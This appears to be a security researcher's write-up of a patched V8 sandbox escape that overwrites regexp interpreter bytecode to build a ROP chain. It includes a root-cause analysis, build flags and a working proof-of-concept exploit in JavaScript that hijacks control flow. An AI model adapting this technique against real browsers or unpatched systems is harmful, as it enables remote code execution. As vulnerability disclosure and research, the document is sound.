# V8 Sandbox Escape via Regexp

This technique, which involves modifying regexp bytecode, enabled me to claim V8CTF M122, M123, and blood Maglev in PlaidCTF.

## RCA

Issue: [330404819](https://issues.chromium.org/issues/330404819)

When attacker have the ability of oob read and write, they can modify `data` in regexp, in which stores bytecode. In `IrregexpInterpreter::Result RawMatch` function, it just read bytecode and execute. 

Also, registers located on stack and has no check of boundarys (Only DCHECK). By modifying bytecode, it's possible to create an rop chain via oob write.

The workflow proceeds as follows: First, generate bytecode using `regex.exec`. Next, modify the bytecode array in data to execute arbitrary bytecode, ensuring to mark tier-up to guarantee the reuse of our malicious bytecode instead of regenerating it. Finally, execute our malicious bytecode again using `regex.exec` on the same string.

Since I could only find a way to move and set registers, I decided to form a ROP chain to get a shell. If there's a way to push RWX addresses onto the stack, it should be possible to achieve direct arbitrary code execution.

This was fixed in commit `b9349d97fd44aec615307c9d00697152da95a66a`.



## Reproduce

The `exp.js` works with debug build of commit `1fd3f98c07afc527a68ee15a9e0d6869defec2a9`.

build flags:

```
is_debug = true
v8_static_library = true
target_cpu = "x64"
v8_enable_sandbox = true
v8_enable_memory_corruption_api=true
```

Use `--sandbox-fuzzing` to enable `Sandbox` at runtime.

The exploit uses `push` and `pop` bytecodes for copying registers, `set` for adding constants on stack and `advance` for calculations.

Poc here hijacks control flow to `0x4141414141414141`, which can be verified via gdb since `--sandbox-fuzzing` will ignore memory violation issues. This should function effectively on other builds, as the offset has been consistently observed to remain unchanged.

```js
// Flags:  --sandbox-fuzzing
let s = "aaaaa";

var sbxMemView = new Sandbox.MemoryView(0, 0xfffffff8);
var addrOf = (o) => Sandbox.getAddressOf(o);

var dv = new DataView(sbxMemView);

var readHeap4 = (offset) => dv.getUint32(offset, true);
var readHeap8 = (offset) => dv.getBigUint64(offset, true);

var writeHeap1 = (offset, value) => dv.setUint8(offset, value, true);
var writeHeap4 = (offset, value) => dv.setUint32(offset, value, true);
var writeHeap8 = (offset, value) => dv.setBigUint64(offset, value, true);

var regex = /[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*/g;
let addr_regex = addrOf(regex);
let data_addr = readHeap4(addr_regex + 0xc);

regex.exec(s);
let bytecode = readHeap4(data_addr + 0x1b);
writeHeap4(data_addr + 0x2f, 2);

let arr = [];

function set_reg(idx, value) {
    arr.push((idx << 8) & 0xffffff00 | 0x08);
    arr.push(value);
}

function success() {
    arr.push(0x0000000e);
}

let idx = 0x52;
set_reg(idx++,0x41414141);
set_reg(idx++,0x41414141);
success();

for (var i = 0; i < arr.length; i++) {
    writeHeap4(bytecode + 0x7 + 4 * i, arr[i]);
}

regex.exec(s);
```
